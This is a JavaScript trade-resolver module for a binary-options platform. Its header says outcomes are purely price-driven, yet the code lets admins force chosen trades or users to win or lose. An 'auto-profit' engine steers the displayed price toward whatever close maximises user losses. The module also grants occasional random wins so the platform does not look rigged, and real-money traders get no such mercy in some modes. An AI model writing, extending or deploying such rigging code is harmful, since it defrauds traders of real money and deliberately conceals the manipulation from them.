// Resolves binary-option trades against the live server price.
//
// Result is purely price-driven: a trade wins if the close price moved in the
// predicted direction vs. the open price (ties = loss, house edge). Balances
// are updated in the DB and pushed to the user's socket room.

const Trade = require('../lib/models/Trade')
const User = require('../lib/models/User')
const AdminControl = require('../lib/models/AdminControl')
const marketFeed = require('./marketFeed')

let io = null
let engine = null
const openTrades = new Map() // tradeId(string) -> trade snapshot

// Admin force control (memory only, no DB):
//   forcedTrades: tradeId -> 'win' | 'loss'   (one specific pending trade)
//   userForce:    userId  -> 'win' | 'loss'   (all of a user's trades)
// Per-trade wins over per-user. 'normal' = remove from the map.
const forcedTrades = new Map()
const userForce = new Map()

function forceTrade(tradeId, result) {
  const id = String(tradeId || '')
  if (!id) return
  if (result === 'win' || result === 'loss') forcedTrades.set(id, result)
  else forcedTrades.delete(id)
  broadcastAdmin()
}

function setUserForce(userId, mode) {
  const id = String(userId || '')
  if (!id) return
  if (mode === 'win' || mode === 'loss') userForce.set(id, mode)
  else userForce.delete(id)
  saveControl()
  broadcastAdmin()
}

function forcedOutcome(t) {
  return forcedTrades.get(t._id.toString()) || userForce.get(t.userId) || null
}

// --- Auto-profit (B-book) engine ------------------------------------------
// For assets the admin has switched on, continuously pick the close price that
// makes the house the most money (users lose the most), weighted by stake, and
// steer the chart toward it. Counts all open trades on the asset (demo + real)
// so it works on this demo-first platform.
const autoAssets = new Set()
const steered = new Set() // symbols currently being steered (for reconcile/cleanup)
let autoAll = false // master switch: steer every asset that has open trades
let mode = 'smart' // 'smart' | 'balanced' | 'strict'
let countDemo = true // true = include demo trades in algorithm, false = real-money only
const liveAssets = new Set() // symbols on the real Binance feed — admin control off for THESE only
let tradingView = false // legacy flag kept for DB compatibility; TradingView embed is disabled

// Realism rates: probability a steered loser is allowed to win anyway.
// These keep the platform from looking rigged while protecting house edge.
const REALISM_RATES = {
  smart: { demo: 0.20, real: 0.0 }, // demo-only mercy
  // Balanced: small money (< $40 total stake) stays natural/random. House profit
  // only kicks in once meaningful money is on the table.
  balanced: { natural: 0.50, single: 0.45, small: 0.25, medium: 0.15, large: 0.05 },
  strict: { demo: 0.0, real: 0.0 }, // no mercy
}
const BALANCED_MIN_STAKE = 40 // below this, trades behave randomly

function isSteered(symbol) {
  return autoAll || autoAssets.has(symbol)
}

// --- persistence (so admin settings survive restart / logout) ----------------
// Load once on boot; save on each admin action only (never in the hot loop).
async function loadControl() {
  try {
    let doc = await AdminControl.findOne({ singleton: 'main' })
    if (!doc) doc = await AdminControl.create({ singleton: 'main' })
    autoAll = !!doc.autoAll
    // Migrate legacy boolean `strict` to new string `mode`.
    // old strict=true -> 'strict', old strict=false -> 'smart'
    if (doc.mode && ['smart', 'balanced', 'strict'].includes(doc.mode)) {
      mode = doc.mode
    } else {
      mode = doc.strict ? 'strict' : 'smart'
    }
    countDemo = doc.countDemo !== false
    autoAssets.clear()
    ;(doc.autoAssets || []).forEach((s) => autoAssets.add(s))
    liveAssets.clear()
    ;(doc.liveAssets || []).forEach((s) => liveAssets.add(s))
    if (engine) for (const s of liveAssets) engine.setLive(s, true) // apply real-feed mode to the engine
    tradingView = false
    userForce.clear()
    if (doc.userForce) doc.userForce.forEach((v, k) => userForce.set(k, v))
    console.log(`[control] loaded admin settings (autoAll=${autoAll}, mode=${mode}, countDemo=${countDemo}, liveAssets=${liveAssets.size}, autoAssets=${autoAssets.size}, userForce=${userForce.size})`)
  } catch (e) {
    console.warn('[control] load failed:', e.message)
  }
}

function saveControl() {
  AdminControl.updateOne(
    { singleton: 'main' },
    {
      $set: {
        autoAll,
        mode,
        strict: mode === 'strict', // legacy compatibility
        countDemo,
        autoAssets: [...autoAssets],
        liveAssets: [...liveAssets],
        tradingView,
        userForce: Object.fromEntries(userForce),
      },
    },
    { upsert: true }
  ).catch((e) => console.warn('[control] save failed:', e.message))
}

function houseNet(trades, x) {
  let net = 0
  for (const t of trades) {
    const userWins = t.direction === 'up' ? x > t.openPrice : x < t.openPrice
    net += userWins ? -(t.amount * (t.payout / 100)) : t.amount // house view
  }
  return net
}

function lossMaxTarget(symbol) {
  const eligible = []
  for (const t of openTrades.values()) {
    if (t.symbol === symbol && (countDemo || t.accountType === 'real')) eligible.push(t)
  }
  // Real balance must always be optimized first. Demo trades can animate the
  // market when no real-money trade is open, but they should never pull the
  // target to a point that lets a real trade win.
  const realTrades = eligible.filter((t) => t.accountType === 'real')
  const trades = realTrades.length ? realTrades : eligible
  if (!trades.length) return null

  // House net is a step function of the close price with steps at each open
  // price; the optimum lies in one of the intervals between (or beyond) the open
  // prices. Stay only a small edge past the threshold instead of 0.12% away:
  // the old wide margin made EUR/USD visibly lurch after a trade was opened.
  const opens = [...new Set(trades.map((t) => t.openPrice))].sort((a, b) => a - b)
  const meta = engine && typeof engine.getMeta === 'function' ? engine.getMeta(symbol) : null
  const minMove = Math.pow(10, -(meta?.digits ?? 2))
  const refPrice = opens[Math.floor(opens.length / 2)] || 1
  const EDGE = Math.max(minMove * 4, Math.abs(refPrice) * 0.00008)
  const tests = [opens[0] - EDGE]
  for (let i = 0; i < opens.length - 1; i++) tests.push((opens[i] + opens[i + 1]) / 2)
  tests.push(opens[opens.length - 1] + EDGE)

  let best = null
  let bestNet = -Infinity
  for (const x of tests) {
    const net = houseNet(trades, x)
    if (net > bestNet) {
      bestNet = net
      best = x
    }
  }
  return {
    price: best,
    deadlineMs: Math.min(...trades.map((t) => t.closeTime)),
    real: realTrades.length > 0,
  }
}

function setAuto(symbol, on) {
  if (!symbol) return
  if (on) autoAssets.add(symbol)
  else {
    autoAssets.delete(symbol)
    if (engine) engine.clearAutoTarget(symbol)
  }
  saveControl()
}

function setAutoAll(on) {
  autoAll = !!on
  saveControl()
  console.log('[AUTO] master ALL =', autoAll)
}

function setMode(newMode) {
  if (!['smart', 'balanced', 'strict'].includes(newMode)) return
  mode = newMode
  saveControl()
  console.log('[AUTO] mode =', mode)
}
function getMode() {
  return mode
}

// Legacy aliases kept for any old callers during transition.
function setStrict(on) {
  setMode(!!on ? 'strict' : 'smart')
}
function getStrict() {
  return mode === 'strict'
}

// For Balanced mode: decide how often a steered loser should still win.
// Below BALANCED_MIN_STAKE ($40) → fully natural/random (50% mercy).
// Above that:
//   Single user → very natural (45% win chance).
//   Small crowd → moderate squeeze (25%).
//   Medium crowd/money → strong squeeze (15%).
//   Heavy one-sided money → hard squeeze (5%).
function balancedRealismRate(eligible) {
  if (!eligible || !eligible.length) return 0
  const count = eligible.length
  const totalStake = eligible.reduce((sum, t) => sum + t.amount, 0)
  if (totalStake < BALANCED_MIN_STAKE) return REALISM_RATES.balanced.natural
  if (count === 1) return REALISM_RATES.balanced.single
  if (totalStake < 300) return REALISM_RATES.balanced.small
  if (totalStake < 1000) return REALISM_RATES.balanced.medium
  return REALISM_RATES.balanced.large
}

// Return the win-override probability for a steered loser.
// `eligible` is the list of trades that were open on this asset at expiry time.
function realismRateFor(accountType, eligible) {
  if (mode === 'strict') return REALISM_RATES.strict.demo // 0 for both
  if (mode === 'smart') return accountType === 'real' ? REALISM_RATES.strict.real : REALISM_RATES.smart.demo
  // balanced
  const base = balancedRealismRate(eligible)
  // Single user gets the same natural feel regardless of account type.
  // Crowded scenarios differentiate demo (retention) vs real (profit).
  if (!eligible || eligible.length === 1) return base
  return accountType === 'real' ? Math.max(0, base * 0.4) : base
}

function setCountDemo(on) {
  countDemo = !!on
  saveControl()
}
function getCountDemo() {
  return countDemo
}

// Put a single asset on (or off) the real Binance feed. Only this asset loses
// admin control; every other asset stays fully admin-controlled.
function setLiveAsset(symbol, on) {
  if (!symbol) return
  if (on) liveAssets.add(symbol)
  else liveAssets.delete(symbol)
  if (engine) engine.setLive(symbol, !!on)
  saveControl()
  console.log('[LIVE]', symbol, '=', !!on)
}
function getLiveAssets() {
  return Array.from(liveAssets)
}

function setTradingView(_on) {
  // Deprecated: do not render TradingView or resolve trades from a different
  // source than the internal chart. Use per-asset Real Market mode instead.
  tradingView = false
  saveControl()
  console.log('[TradingView] disabled; use per-asset Real Market mode')
}
function getTradingView() {
  return false
}

function getAutoAssets() {
  return Array.from(autoAssets)
}
function getAutoAll() {
  return autoAll
}

// Called ~1/sec by the server loop: recompute and apply targets, then clear any
// asset that's no longer being steered (e.g. its trades expired, or auto off).
function runAuto() {
  if (!engine) return
  const targets = new Set()
  if (autoAll) {
    for (const t of openTrades.values()) targets.add(t.symbol)
  } else {
    for (const s of autoAssets) targets.add(s)
  }
  // live (real-feed) symbols are never steered — admin can't intrude on them
  for (const s of [...targets]) if (engine.isLive(s)) targets.delete(s)
  for (const symbol of targets) {
    const target = lossMaxTarget(symbol)
    if (target == null) engine.clearAutoTarget(symbol)
    else engine.setAutoTarget(symbol, target.price, { deadlineMs: target.deadlineMs, real: target.real })
    steered.add(symbol)
  }
  // assets we steered before but shouldn't anymore -> back to normal random
  for (const symbol of [...steered]) {
    if (!targets.has(symbol)) {
      engine.clearAutoTarget(symbol)
      steered.delete(symbol)
    }
  }
}

function setup(_io, _engine) {
  io = _io
  engine = _engine
}

function add(trade, email = '') {
  // userId may be a raw ObjectId or a populated User doc
  const uid = (trade.userId && trade.userId._id ? trade.userId._id : trade.userId).toString()
  openTrades.set(trade._id.toString(), {
    _id: trade._id,
    userId: uid,
    email: email || (trade.userId && trade.userId.email) || '',
    symbol: trade.symbol,
    direction: trade.direction,
    amount: trade.amount,
    duration: trade.duration,
    payout: trade.payout,
    openPrice: trade.openPrice,
    openTime: new Date(trade.openTime).getTime(),
    closeTime: new Date(trade.closeTime).getTime(),
    accountType: trade.accountType,
  })
}

async function loadOpenFromDB() {
  // populate the email once (one-time boot cost) so the admin monitor can show
  // who placed each trade without per-second DB lookups
  const open = await Trade.find({ status: 'open' }).populate('userId', 'email')
  for (const t of open) add(t, t.userId && t.userId.email)
  console.log(`[resolver] loaded ${open.length} open trade(s) from DB`)
}

// Live snapshot of open trades for the admin monitor (memory only). Sorted by
// soonest to expire. msLeft is computed fresh on each call.
function getOpenForAdmin() {
  const now = Date.now()
  return Array.from(openTrades.values())
    .map((t) => ({
      id: t._id.toString(),
      userId: t.userId,
      email: t.email || '',
      symbol: t.symbol,
      direction: t.direction,
      amount: t.amount,
      duration: t.duration,
      payout: t.payout,
      accountType: t.accountType,
      openPrice: t.openPrice,
      openTime: t.openTime,
      closeTime: t.closeTime,
      msLeft: Math.max(0, t.closeTime - now),
      forced: forcedTrades.get(t._id.toString()) || null, // 'win' | 'loss' | null
      userMode: userForce.get(t.userId) || null, // 'win' | 'loss' | null
    }))
    .sort((a, b) => a.msLeft - b.msLeft)
}

// Push the current open-trades snapshot to every connected admin.
function broadcastAdmin() {
  if (io) io.to('admins').emit('admin:trades', getOpenForAdmin())
}

// Price used to open/resolve a trade. In TradingView mode, supported assets are
// priced on the REAL LIVE feed (matching what TradingView shows the user); per-
// asset live mode uses the engine's (delayed) real price; otherwise the engine.
function priceForResolve(symbol) {
  if (tradingView && marketFeed.liveSupported(symbol)) {
    const lp = marketFeed.livePrice(symbol)
    if (lp != null) return engine.round(symbol, lp)
  }
  return engine.getPrice(symbol)
}
// "genuine market" = no admin force/steer: per-asset live OR TradingView mode.
function isGenuine(symbol) {
  return engine.isLive(symbol) || (tradingView && marketFeed.liveSupported(symbol))
}

async function resolveTrade(t, eligibleContext = []) {
  const closePrice = priceForResolve(t.symbol)
  // Genuine real-market symbols (live feed or TradingView mode) resolve purely on
  // the real price the user saw — admin force/auto is ignored, no intrusion.
  const live = isGenuine(t.symbol)
  const forced = live ? null : forcedOutcome(t)
  let won =
    forced === 'win'
      ? true
      : forced === 'loss'
      ? false
      : t.direction === 'up'
      ? closePrice > t.openPrice
      : closePrice < t.openPrice
  forcedTrades.delete(t._id.toString()) // one-shot per-trade force

  // Realism override: when the auto engine is steering this asset and the user
  // is losing purely because of the steer, occasionally let them win so it never
  // looks like a 100% wipeout. The chance depends on the selected mode:
  //   smart    -> demo-only mercy (20%)
  //   balanced -> single user very natural (45%), crowds squeezed harder
  //   strict   -> no mercy
  // Explicit per-trade/per-user force is never overridden.
  if (!live && !forced && !won && isSteered(t.symbol) && Math.random() < realismRateFor(t.accountType, eligibleContext)) {
    won = true
  }
  console.log(
    `[RESOLVE] ${t.symbol} ${t.direction} acct=${t.accountType} open=${t.openPrice} close=${closePrice} -> ${won ? 'WIN' : 'LOSS'} (forced=${forced || '-'}, mode=${mode}, autoTarget=${engine.autoTarget?.[t.symbol] ?? '-'})`
  )
  const profit = won ? Number((t.amount * (t.payout / 100)).toFixed(2)) : -t.amount

  // credit: on win return stake + winnings; on loss stake was already debited
  const credit = won ? t.amount + profit : 0
  const balanceField = t.accountType === 'real' ? 'realBalance' : 'demoBalance'

  await Trade.findByIdAndUpdate(t._id, {
    status: won ? 'won' : 'lost',
    closePrice,
    profit,
  })

  let user = null
  if (credit > 0) {
    user = await User.findByIdAndUpdate(
      t.userId,
      { $inc: { [balanceField]: credit } },
      { new: true }
    )
  } else {
    user = await User.findById(t.userId)
  }

  if (io && user) {
    io.to(`user:${t.userId}`).emit('trade_closed', {
      tradeId: t._id.toString(),
      symbol: t.symbol,
      direction: t.direction,
      result: won ? 'win' : 'loss',
      openPrice: t.openPrice,
      closePrice,
      amount: t.amount,
      profit,
      accountType: t.accountType,
      balance: { demoBalance: user.demoBalance, realBalance: user.realBalance },
    })
  }

  // the trade left the open set — refresh every admin monitor
  broadcastAdmin()
}

// drive this from the main loop
async function checkExpiries() {
  const now = Date.now()
  for (const [id, t] of openTrades) {
    if (now >= t.closeTime) {
      // Capture the market context (other open trades on this asset) BEFORE
      // removing this trade, so the realism rate is based on actual crowding.
      const eligible = []
      for (const tr of openTrades.values()) {
        if (tr.symbol === t.symbol && (countDemo || tr.accountType === 'real')) eligible.push(tr)
      }
      openTrades.delete(id)
      try {
        await resolveTrade(t, eligible)
      } catch (e) {
        console.error('[resolver] failed to resolve', id, e.message)
      }
    }
  }
}

function openCount() {
  return openTrades.size
}

module.exports = {
  setup,
  add,
  loadOpenFromDB,
  loadControl,
  checkExpiries,
  openCount,
  getOpenForAdmin,
  broadcastAdmin,
  forceTrade,
  setUserForce,
  setAuto,
  setAutoAll,
  setMode,
  getMode,
  setStrict,
  getStrict,
  setCountDemo,
  getCountDemo,
  setLiveAsset,
  getLiveAssets,
  setTradingView,
  getTradingView,
  priceForResolve,
  getAutoAssets,
  getAutoAll,
  runAuto,
}
